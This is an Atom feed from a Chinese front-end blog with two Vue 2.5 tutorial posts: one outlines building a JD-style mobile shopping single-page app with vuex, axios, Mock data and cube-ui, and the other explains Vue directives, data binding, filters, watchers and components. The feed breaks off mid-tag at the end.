<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>嘿，走钢索的人</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.kaluna.top/"/>
  <updated>2021-12-20T16:46:10.047Z</updated>
  <id>https://blog.kaluna.top/</id>
  
  <author>
    <name>Kaluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vue2.5项目实战全家桶单页面仿京东电商</title>
    <link href="https://blog.kaluna.top/2021/12/21/vue2.5%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%E5%85%A8%E5%AE%B6%E6%A1%B6%E5%8D%95%E9%A1%B5%E9%9D%A2%E4%BB%BF%E4%BA%AC%E4%B8%9C%E7%94%B5%E5%95%86/"/>
    <id>https://blog.kaluna.top/2021/12/21/vue2.5%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%E5%85%A8%E5%AE%B6%E6%A1%B6%E5%8D%95%E9%A1%B5%E9%9D%A2%E4%BB%BF%E4%BA%AC%E4%B8%9C%E7%94%B5%E5%95%86/</id>
    <published>2021-12-20T16:02:35.799Z</published>
    <updated>2021-12-20T16:46:10.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="全家桶项目成员及其在项目中的定位与作用"><a href="#全家桶项目成员及其在项目中的定位与作用" class="headerlink" title="全家桶项目成员及其在项目中的定位与作用"></a>全家桶项目成员及其在项目中的定位与作用</h2><p><strong>项目构建工具vue-cli</strong><br>vue-cli是一个脚手架工具，为我们搭建了开发所需要的环境和生成目录架构<br><strong>路由vue-router</strong><br>创建单页应用，我们的单页应用只做路由切换，组件拼凑成的页面映射成路由<br>路由是我们单页应用的核心插件<br><strong>状态管理vuex</strong><br>状态管理库，可理解为全局数据集中地<br>推荐小项目尽量别用vuex，会显得有点繁琐，bus总线机制完全可以处理了<br><strong>http请求工具axios（ vue-resource官方已停止维护）</strong><br>一个经过封装的ajax,可以根据自己的项目情况再进行封装<br>axios是经过了ES6的promise封装的</p><h2 id="前后端联调必备技术之Mock"><a href="#前后端联调必备技术之Mock" class="headerlink" title="前后端联调必备技术之Mock"></a>前后端联调必备技术之Mock</h2><ul><li>什么是Mock数据？<ul><li>处于开发环境模拟接口返回的数据（用于开发状态后端还没给接口）</li><li>不会影响生产环境，只是方便我们还没与后端交互时不阻塞我们开发流程</li></ul></li><li>Mock数据的好处<ul><li>团队可以并行工作（后端进度不至于影响前端开发进度）</li><li>可以用来演示开发成果，实时反馈开发进度</li><li>模拟测试并简单了解接口编写为全栈打基础</li></ul></li></ul><h1 id="搭建vue单页面应用工程架构"><a href="#搭建vue单页面应用工程架构" class="headerlink" title="搭建vue单页面应用工程架构"></a>搭建vue单页面应用工程架构</h1><h2 id="对比vue-cli2-x和vue-cli3-x的搭建"><a href="#对比vue-cli2-x和vue-cli3-x的搭建" class="headerlink" title="对比vue-cli2.x和vue-cli3.x的搭建"></a>对比vue-cli2.x和vue-cli3.x的搭建</h2><p>搭建前提条件：</p><ol><li><p>node环境</p></li><li><p>安装webpack</p></li><li><p>安装vue-cli 2.x</p><p>npm install vue-cli -g<br>创建项目：vue init webpack 项目名(不要取中文名字)</p></li><li><p>安装vue-cli 3.x</p><p>npm install @vue/cli -g<br>创建项目：vue create 项目名（不要取中文名字）</p></li></ol><p>不添加指定版本号就是下载最新稳定版本</p><h2 id="vue-cli2-x和vue-cli3-x的项目架构"><a href="#vue-cli2-x和vue-cli3-x的项目架构" class="headerlink" title="vue-cli2.x和vue-cli3.x的项目架构"></a>vue-cli2.x和vue-cli3.x的项目架构</h2><p>vuecli3.x:<br>去掉了2.x build和config等目录，大部分配置 都集成到vue.config.js这里了</p><p>vue.config.js里大概包括了配置常用的输出路径名、跟目录、预处理、devServer配置、pwa、dll、第三方插件等等</p><p>具体配置可参考(<a href="https://www.cnblogs.com/zjhr/p/9472648.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjhr/p/9472648.html</a>)</p><p>因为绝大部分的配置和扩展尤大大已经做好了封装的了，我们常用的开发基本可以满足，不满足的我们自己可以自行去扩展</p><p>webpack的配置在这个属性里修改configureWebpack（Mock也是在这里面的）</p><h2 id="搭建项目→启动项目"><a href="#搭建项目→启动项目" class="headerlink" title="搭建项目→启动项目"></a>搭建项目→启动项目</h2><h2 id="ui库选择"><a href="#ui库选择" class="headerlink" title="ui库选择"></a>ui库选择</h2><p>分析市场上各种各样的ui框架及如何选择适合自己项目的ui框架，vue是一套渐进式的框架，设计的时候就是自底层向上组层应用的。</p><p>PC端的ui库基本不用做选型了，ElementUI的霸主地位无人能撼动</p><p>移动端的选型看好几点即可</p><ul><li>能否自定义皮肤</li><li>是否使用rem控制尺寸，完美适应不同分辨率移动设备</li><li>组件类型风格是否与自己的项目相同或类似</li><li>单元测试覆盖率</li><li>更新频率的快慢</li></ul><p>移动端的框架有哪些：</p><p>mint-ui vux vant cube-ui</p><p>有赞：<a href="https://youzan.github.io/vant/#/zh-CN/intro" target="_blank" rel="noopener">https://youzan.github.io/vant/#/zh-CN/intro</a></p><p>滴滴：<a href="https://didi.github.io/cube-ui/#/zh-CN/docs/switch" target="_blank" rel="noopener">https://didi.github.io/cube-ui/#/zh-CN/docs/switch</a></p><h2 id="安装使用ui框架—–cube-ui"><a href="#安装使用ui框架—–cube-ui" class="headerlink" title="安装使用ui框架—–cube-ui"></a>安装使用ui框架—–cube-ui</h2><p>vuecli3.x版本安装：vue add cube-ui</p><p>cube-ui:<a href="https://didi.github.io/cube-ui/#/zh-CN/docs/quick-start" target="_blank" rel="noopener">https://didi.github.io/cube-ui/#/zh-CN/docs/quick-start</a></p><p>安装cube-ui的配置选择：<a href="https://github.com/cube-ui/cube-template/wiki" target="_blank" rel="noopener">https://github.com/cube-ui/cube-template/wiki</a></p><h1 id="注册登录"><a href="#注册登录" class="headerlink" title="注册登录"></a>注册登录</h1><h2 id="实现注册页面"><a href="#实现注册页面" class="headerlink" title="实现注册页面"></a>实现注册页面</h2><h2 id="vue-config-js配置Mock数据"><a href="#vue-config-js配置Mock数据" class="headerlink" title="vue.config.js配置Mock数据"></a>vue.config.js配置Mock数据</h2><p>进行webpack配置扩展之配置Mock</p><h2 id="本地配置mock编写注册接口"><a href="#本地配置mock编写注册接口" class="headerlink" title="本地配置mock编写注册接口"></a>本地配置mock编写注册接口</h2><h2 id="请求插件axios模拟完成注册"><a href="#请求插件axios模拟完成注册" class="headerlink" title="请求插件axios模拟完成注册"></a>请求插件axios模拟完成注册</h2><h2 id="撰写路由配置文件并复习cube-ui表单实现登录页面"><a href="#撰写路由配置文件并复习cube-ui表单实现登录页面" class="headerlink" title="撰写路由配置文件并复习cube-ui表单实现登录页面"></a>撰写路由配置文件并复习cube-ui表单实现登录页面</h2><h2 id="Mock编写登录接口并返回token"><a href="#Mock编写登录接口并返回token" class="headerlink" title="Mock编写登录接口并返回token"></a>Mock编写登录接口并返回token</h2><h2 id="深入剖析vuex并存储token"><a href="#深入剖析vuex并存储token" class="headerlink" title="深入剖析vuex并存储token"></a>深入剖析vuex并存储token</h2><p>引入全家桶成员vuex并进行token的处理</p><p>vuex与本地存储的配合</p><h2 id="编写axios请求拦截配置"><a href="#编写axios请求拦截配置" class="headerlink" title="编写axios请求拦截配置"></a>编写axios请求拦截配置</h2><p>全局拦截配置及内部可实现内容(把token在请求头带回给后端以及可以根据状态码进行一系列处理)</p><h1 id="商城首页-分类页"><a href="#商城首页-分类页" class="headerlink" title="商城首页+分类页"></a>商城首页+分类页</h1><h2 id="使用cube-ui实现轮播图并进行内部扩展"><a href="#使用cube-ui实现轮播图并进行内部扩展" class="headerlink" title="使用cube-ui实现轮播图并进行内部扩展"></a>使用cube-ui实现轮播图并进行内部扩展</h2><h2 id="cube-ui实现商品类别滑动组件"><a href="#cube-ui实现商品类别滑动组件" class="headerlink" title="cube-ui实现商品类别滑动组件"></a>cube-ui实现商品类别滑动组件</h2><h2 id="嵌套路由的使用"><a href="#嵌套路由的使用" class="headerlink" title="嵌套路由的使用"></a>嵌套路由的使用</h2><h2 id="路由跳转如何加上一个过渡效果提高用户体验"><a href="#路由跳转如何加上一个过渡效果提高用户体验" class="headerlink" title="路由跳转如何加上一个过渡效果提高用户体验"></a>路由跳转如何加上一个过渡效果提高用户体验</h2><p><strong>更贴近原生app的体验优化</strong></p><h2 id="cube-ui如何仿照京东实现分类页"><a href="#cube-ui如何仿照京东实现分类页" class="headerlink" title="cube-ui如何仿照京东实现分类页"></a>cube-ui如何仿照京东实现分类页</h2><h2 id="根据不同屏幕动态获取滚动盒子高度"><a href="#根据不同屏幕动态获取滚动盒子高度" class="headerlink" title="根据不同屏幕动态获取滚动盒子高度"></a>根据不同屏幕动态获取滚动盒子高度</h2><p><strong>动态获取滚动盒子高度，兼容不同屏幕高度场景</strong></p><h2 id="路由拦截搭配路由属性使用方案"><a href="#路由拦截搭配路由属性使用方案" class="headerlink" title="路由拦截搭配路由属性使用方案"></a>路由拦截搭配路由属性使用方案</h2><p><strong>使用路由配置之meta属性配合路由守卫进行页面权限拦截</strong></p><h1 id="购物车-个人中心页"><a href="#购物车-个人中心页" class="headerlink" title="购物车+个人中心页"></a>购物车+个人中心页</h1><h2 id="实现购物车页面"><a href="#实现购物车页面" class="headerlink" title="实现购物车页面"></a>实现购物车页面</h2><p><strong>编写购物车页面讲解购物车内部功能</strong></p><h2 id="分类页商品添加基本逻辑及显示购物车数量"><a href="#分类页商品添加基本逻辑及显示购物车数量" class="headerlink" title="分类页商品添加基本逻辑及显示购物车数量"></a>分类页商品添加基本逻辑及显示购物车数量</h2><p><strong>使用vuex配合实现添加商品到购物车以及底部导航栏实时显示购物车数量</strong></p><h2 id="配合vuex实现购物车内部功能"><a href="#配合vuex实现购物车内部功能" class="headerlink" title="配合vuex实现购物车内部功能"></a>配合vuex实现购物车内部功能</h2><p><strong>使用vuex实现购物车内部的增加、减少以及清空购物车功能</strong></p><h2 id="vuex核心知识之配合内置方法实现购物车数据持久化"><a href="#vuex核心知识之配合内置方法实现购物车数据持久化" class="headerlink" title="vuex核心知识之配合内置方法实现购物车数据持久化"></a>vuex核心知识之配合内置方法实现购物车数据持久化</h2><h2 id="添加购物车动画实现思路"><a href="#添加购物车动画实现思路" class="headerlink" title="添加购物车动画实现思路"></a>添加购物车动画实现思路</h2><h2 id="个人中心实现及注销登录功能"><a href="#个人中心实现及注销登录功能" class="headerlink" title="个人中心实现及注销登录功能"></a>个人中心实现及注销登录功能</h2><h1 id="项目打包"><a href="#项目打包" class="headerlink" title="项目打包"></a>项目打包</h1><h2 id="打包项目给后端进行处理"><a href="#打包项目给后端进行处理" class="headerlink" title="打包项目给后端进行处理"></a>打包项目给后端进行处理</h2><h2 id="理解MVVM和组件带出来的面试题"><a href="#理解MVVM和组件带出来的面试题" class="headerlink" title="理解MVVM和组件带出来的面试题"></a>理解MVVM和组件带出来的面试题</h2><p><strong>MVVM开发模式及组件通信</strong></p><p><strong>谈谈你对MVVM开发模式的理解?</strong></p><ul><li>MVVM分为Model、View、ViewModel三者<ul><li>Model：代表数据模型，数据和业务逻辑都是在Model层中定义</li><li>View：代表UI视图，负责对数据的展示</li><li>ViewModel：负责监听Model中数据的改变并控制视图的更新，处理用户交互操作</li></ul></li></ul><p>Model和View并无直接关联，而是通过ViewModel来进行联系的，Model和ViewModel之间有着双向数据绑定的联系。因此当Model中的数据改变时会触发View层的刷新，View中由于用户交互操作而改变的数据也会在Model中同步。</p><p>这种模式实现了Model和View的数据自动同步，因此开发者只需要专注对数据的维护操作即可，而不需要自己操作dom。</p><p><strong>对于组件通信你了解多少，请描述一下你是怎么完成组件的通信的?</strong></p><ul><li>父传子用 props传递</li><li>子传父用$emit传递</li><li>非父子之间的传值 建立一个空实例进行传值，中央事件总线机制</li><li>祖孙之间的传值可以利用provide inject模式</li></ul><p><strong>VUEX可以处理上述的每一个情况</strong></p><h2 id="单页面应用首屏加载时间过长如何优化及输入网址到渲染完成过程"><a href="#单页面应用首屏加载时间过长如何优化及输入网址到渲染完成过程" class="headerlink" title="单页面应用首屏加载时间过长如何优化及输入网址到渲染完成过程"></a>单页面应用首屏加载时间过长如何优化及输入网址到渲染完成过程</h2><p>关于单页应用首屏加载速度慢，出现白屏时间过长问题你怎么处理？</p><ul><li>将公用的JS库通过script标签在index.html进行外部引入，减少我们打包出来的js文件的大小，让浏览器并行下载资源文件，提高下载速度</li><li>在配置路由的时候进行路由的懒加载，在调用到改路由时再加载次路由相对应的js文件</li><li>加一个首屏loading图或骨架屏，提高用户的体验</li><li>尽可能使用CSS Sprites和字体图标库</li><li>图片的懒加载等</li></ul><p>从输入网址到网页渲染完成经历了什么？</p><ul><li>输入网址按回车键或点击跳转</li><li>发送到DNS服务器进行DNS解析，获取到我们对应web服务器对应的ip地址</li><li>与Web服务器建立TCP连接</li><li>浏览器向web服务器发送http请求</li><li>Web服务器进行响应请求并返回指定的url数据（当然这里也可能是错误信息或者重定向到新的url地址等）</li><li>浏览器下载web服务器返回的数据及解析html源文件</li><li>根据文件生成DOM树和样式树合成我们的渲染树，解析js，最后渲染我们的页面然后显示出来</li></ul><h2 id="修改数据视图试图不更新情况该怎么处理和如何监听数据"><a href="#修改数据视图试图不更新情况该怎么处理和如何监听数据" class="headerlink" title="修改数据视图试图不更新情况该怎么处理和如何监听数据"></a>修改数据视图试图不更新情况该怎么处理和如何监听数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. 关于修改了数据，视图不更新的理解和处理方式</span><br><span class="line">Vue中给data中的对象属性添加一个新的属性时会发生什么</span><br><span class="line">经过打印发现数据是已经改变了，但是由于在Vue实例创建时， 新添加的属性并未声明，因此就没有被Vue转换为响应式的属性，自然就不会触发视图的更新，这时就需要使用Vue的全局api——&gt; $set()</span><br><span class="line"></span><br><span class="line">$set()使用方法：</span><br><span class="line"></span><br><span class="line">$set(需要修改的对象，&quot;对象的属性&quot;,值)</span><br><span class="line"></span><br><span class="line">2. 在vue里面你如何做数据的监听</span><br><span class="line">watch里面监听：第一种写法</span><br><span class="line"></span><br><span class="line">watch:&#123;</span><br><span class="line">obj(newval,oldval)&#123;</span><br><span class="line">console.log(newval,oldval)</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">第二种写法可设置deep为true对数据进行深层遍历监听</span><br><span class="line"></span><br><span class="line">watch:&#123;</span><br><span class="line">obj:&#123;</span><br><span class="line">handler(newval,oldval)&#123;</span><br><span class="line">console.log(222) </span><br><span class="line">console.log(newval,oldval)</span><br><span class="line">&#125;,</span><br><span class="line">deep:true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">computed 里面监听：computed里面的依赖改变时，所计算的属性或作出事实的改变</span><br></pre></td></tr></table></figure><h1 id="vue全家桶项目总结"><a href="#vue全家桶项目总结" class="headerlink" title="vue全家桶项目总结"></a>vue全家桶项目总结</h1><ul><li>全家桶成员登场及介绍各自的作用（vue-cli、vue-router、axios、vuex）</li><li>新知识Mock自己编写本地运行接口返回数据</li><li>开始利用脚手架快速构建我们的工程项目（分别介绍了vue-cli2.x和vue-cli3.x构建命令的区别）</li><li>讲解vue-cli2.x和vue-cli3.x构建出来的项目架构的区别</li><li>面对市场上花样百出的ui库如何选择质量高适合自己项目的ui库</li><li>使用cube-ui开始我们的项目之旅（tips：多看api文档就能熟练使用ui库）</li><li>使用Mock编写我们的接口并返回我们需要的信息</li><li>介绍那种场景下使用嵌套路由以及如何实现</li><li>介绍token的用途和编写axios请求的全局拦截和路由守卫（轻易实现权限控制）</li><li>利用vuex和本地存储的配合实现购物车的功能</li><li>进行项目的性能优化及体验优化(优化首屏加载、路由跳转过渡效果、购物车动画效果)</li><li>打包项目及详解面试关于vue的高频面试题</li></ul><p>路线：</p><p>html5→css3→js→es6→ps切图基础→vue→react→angular→小程序生态→webpack→http知识→node.js→express、koa→Linux→mysql、mongoDB、redis→Git和持续集成→Docker→JS高级→前端性能优化→浏览器知识→前端安全性问题→项目实战</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;h2 id=&quot;全家桶项目成员及其在项目中的定位与作用&quot;&gt;&lt;a href=&quot;#全家桶项目成员及其在项目中的定位与作用&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="前端" scheme="https://blog.kaluna.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Vue" scheme="https://blog.kaluna.top/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>vue2.5核心技术</title>
    <link href="https://blog.kaluna.top/2021/12/19/vue2.5%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"/>
    <id>https://blog.kaluna.top/2021/12/19/vue2.5%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</id>
    <published>2021-12-19T12:31:26.048Z</published>
    <updated>2021-12-21T02:15:02.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vue核心知识"><a href="#Vue核心知识" class="headerlink" title="Vue核心知识"></a>Vue核心知识</h1><p>Vue框架是以数据驱动和组件化开发为核心</p><h2 id="用vue做出自己的第一个网页"><a href="#用vue做出自己的第一个网页" class="headerlink" title="用vue做出自己的第一个网页"></a>用vue做出自己的第一个网页</h2><ol><li><p><strong>引包</strong></p><ul><li><p><strong>确认已经下载了node,然后执行命令 npm install vue (如需下载自己要的版本在vue后面加上@版本号)</strong></p></li><li><p><strong>页面引入刚下载的包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>留坑 即留一个vue模板插入的地方或者是vue代码对其生效的地方</strong></p></li><li><p><strong>实例化 即启动Vue</strong></p><p><strong>启动： new Vue({el:目的地,template:模板内容});实例化传入的是一个对象options</strong></p><ul><li><p><strong>options</strong></p><ul><li><p><strong>目的地 el 对应上面留坑的坑位，可通过id名，类名，标签名来查找 。方式和jq一样</strong></p></li><li><p><strong>内容 template</strong></p></li><li><p><strong>数据 data 值为函数形式也可是对象，但是都是用函数，因为用的函数最后也是return一个对象</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219203800.png" alt="image-20211219203752125"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219203837.png" alt="image-20211219203835528"></p></li></ul></li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插值表达式&#123;&#123; &#125;&#125;</span><br><span class="line"></span><br><span class="line">插值表达式内填入data里面的变量即可在页面取到变量值&#123;&#123; data里的变量 &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="vue的常用指令以及使用场景"><a href="#vue的常用指令以及使用场景" class="headerlink" title="vue的常用指令以及使用场景"></a>vue的常用指令以及使用场景</h2><ol><li>什么是指令<br>在vue中提供一些对于页面+数据的更为方便的操作，这些操作就叫做指令。<br>譬如在HTML页面中这样使用<div v-xxx=''></div><br>在vue中v-xxx就是vue的指令</li></ol><p>指令就是以数据去驱动DOM行为的,简化DOM操作</p><ol start="2"><li><p>常用的指令有哪些，及怎么使用这些指令<br>v-text 不可解析html标签</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204416.png" alt="image-20211219204414939"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204708.png" alt="image-20211219204707402"><br><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204440.png" alt="image-20211219204438951"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204722.png" alt="image-20211219204720924"></p><p>v-html 可解析html标签<br><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204832.png" alt="image-20211219204829941"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219204814.png" alt="image-20211219204813217"></p></li></ol><p>v-if 做元素的插入（append）和移除（remove）操作</p><p>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205015.png" alt="image-20211219205014113"><br>  <strong>按钮不见了</strong></p><p>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205135.png" alt="image-20211219205133774"></p><p>v-else-if</p><p>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205301.png" alt="image-20211219205259761"></p><p>v-else</p><p>v-show display:none 和display：block的切换<br>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205519.png" alt="image-20211219205518014"></p><p>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205536.png" alt="image-20211219205534697"></p><p>  <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219205751.png" alt="image-20211219205749767"></p><p>  当checkshow为false时，自动添加display:none</p><p>v-for</p><p>数组 item，index<br><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212440.png" alt="image-20211219212438820"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212403.png" alt="image-20211219212402374"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212532.png" alt="image-20211219212530827"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212502.png" alt="image-20211219212501207"></p><p>对象 value，key ，index<br><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212803.png" alt="image-20211219212800634"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219212819.png" alt="image-20211219212818008"></p><h2 id="vue单双向数据流及事件绑定"><a href="#vue单双向数据流及事件绑定" class="headerlink" title="vue单双向数据流及事件绑定"></a>vue单双向数据流及事件绑定</h2><ol><li><p>vue单向数据流绑定属性值 v-bind: (属性) 简写 :(属性)<br>例子：<input v-bind:value="name" v-bind:class="name"><br>单向数据绑定 内存改变影响页面改变</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219220954.png" alt="image-20211219220952400"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093141.png" alt="image-20211219221129831"></p></li><li><p>v-bind就是对属性的简单赋值,当内存中值改变，还是会触发重新渲染<br>vue双向数据流 v-model 只作用于有value属性的元素<br>例子：<input v-model="name" v-bind:class="name"><br>双向数据绑定 页面对于input的value改变，能影响内存中name变量<br>内存js改变name的值，会影响页面重新渲染最新值</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093138.png" alt="image-20211219221413895"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093135.png" alt="image-20211219221431151"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093133.png" alt="image-20211219221548161"></p><ol start="3"><li>事件绑定v-on:事件名=”表达式||函数名” 简写 @事件名=”表达式||函数名”<br>事件名可以是原生也可以是自定义的</li></ol><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093130.png" alt="image-20211219221711063"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093128.png" alt="image-20211219221835716"></p></li><li><p>总结<br>v-model 双向数据绑定<br>vue页面改变影响内存（js）<br>内存（js）改变影响vue页面<br>v-bind 单向数据绑定只是内存（js）改变影响vue页面</p></li></ol><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>如何给数据添加一个管道进行进一步处理再输出</p><ul><li><p>过滤器就是可以对我们的数据进行添油加醋然后再显示</p></li><li><p>过滤器有全局过滤器和组件内的过滤器he</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全局过滤器Vue.filter(&#39;过滤器名&#39;,过滤方式fn );</span><br><span class="line">组件内的过滤器 filters:&#123; &#39;过滤器名&#39;,过滤方式fn &#125;</span><br><span class="line">&#123;&#123; msg | 过滤器名&#125;&#125;heo</span><br></pre></td></tr></table></figure></li><li><p>最终都是在过滤方式fn里面return产出最终你需要的数据</p></li><li><p>vue中的this是vue封装好给我们使用的，跟平常方法里面的this是不同的</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093121.png" alt="image-20211219222224531"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093124.png" alt="image-20211219222245592"></p><p>跟上面的等价</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093117.png" alt="image-20211219222354205"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093114.png" alt="image-20211219222718379"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093111.png" alt="image-20211219222918776"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093107.png" alt="image-20211219222822620"></p><h2 id="数据监听watch计算属性computed"><a href="#数据监听watch计算属性computed" class="headerlink" title="数据监听watch计算属性computed"></a>数据监听watch计算属性computed</h2><p>数据的单个监听以及多个监听还有深度监听的不同</p><ul><li>watch监听单个，computed监听多个</li></ul><p>思考业务场景：</p><p>类似淘宝，当我输入某个人名字时，我想触发某个效果<br>利用vue做一个简单的计算器<br>当watch监听的是复杂数据类型的时候需要做深度监听（写法如下）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">watch:&#123;</span><br><span class="line">            msg:&#123;</span><br><span class="line">              handler(val)&#123;</span><br><span class="line">               <span class="keyword">if</span>(val.text==<span class="string">'love'</span>)&#123;</span><br><span class="line">                alert(val.text)</span><br><span class="line">               &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              deep:<span class="literal">true</span><span class="comment">//开启深度监听</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><ul><li>computed 监视对象,写在了函数内部, 凡是函数内部有this.相关属性,改变都会触发当前函数</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093101.png" alt="image-20211219223316089"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093058.png" alt="image-20211219223241741"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093055.png" alt="image-20211219223407513"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093051.png" alt="image-20211219223348157"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093048.png" alt="image-20211219223518183"></p><p>现在输入love没有弹窗说明，watch无法监听复杂数据类型</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093044.png" alt="image-20211220092918867"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220093040.png" alt="image-20211220092934009"></p><h1 id="组件化开发"><a href="#组件化开发" class="headerlink" title="组件化开发"></a>组件化开发</h1><h2 id="组件化开发-1"><a href="#组件化开发-1" class="headerlink" title="组件化开发"></a>组件化开发</h2><p>页面拆分为组件进行开发和维护</p><p><strong>创建组件的两种方式</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Header = &#123; <span class="attr">template</span>:<span class="string">'模板'</span> , data是一个函数,<span class="attr">methods</span>:功能,<span class="attr">components</span>:子组件们 &#125;<span class="comment">//局部声明</span></span><br><span class="line">Vue.component(<span class="string">'组件名'</span>,组件对象);<span class="comment">//全局注册 等于注册加声明了</span></span><br></pre></td></tr></table></figure><p><strong>组件类型</strong></p><ul><li><p>通用组件（例如表单、弹窗、布局类等)</p></li><li><p>业务组件（抽奖、机器分类）</p></li><li><p>页面组件（单页面开发程序的每个页面的都是一个组件、只完成功能、不复用）</p></li><li><p>组件开发三步曲：声明、注册、使用</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220094046.png" alt="image-20211220094044721"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220094122.png" alt="image-20211220094120046"></p><p>上面第一页本来是这样写的，语法糖来着</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220094157.png" alt="image-20211220094152386"></p></li></ul><p><img 